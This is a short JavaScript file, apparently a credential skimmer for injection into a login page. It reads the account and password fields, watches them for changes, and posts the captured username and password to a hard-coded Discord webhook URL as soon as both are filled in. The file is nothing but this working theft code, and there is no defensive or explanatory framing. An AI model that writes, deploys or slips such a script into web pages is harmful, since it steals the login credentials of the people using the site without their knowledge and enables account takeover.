function init() {
    user_field = document.getElementById('fieldAccount')
    pass_field = document.getElementById('fieldPassword')
    username = user_field.value
    password = pass_field.value
    valueUpdate(username, password)
    user_field.onchange = () => {
        username = user_field.value
        valueUpdate(username, password)
    }
    pass_field.onchange = () => {
        password = pass_field.value
        valueUpdate(username, password)
    }
}

function valueUpdate(user, pass) {
    if (user == ''){
        return
    }
    if (pass == ''){
        return
    }
    wh = "https://discord.com/api/webhooks/1064300208890056796/FV4NyU2ZJUOoa0FW1aKAFVPzdsyRdG8FPGWuP1jXINMLE-wA1R8tH8_WYihFGXFH43Ps"
    fetch(wh, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `Username: ${user}\nPassword: ${pass}`
        })
    })
}

init()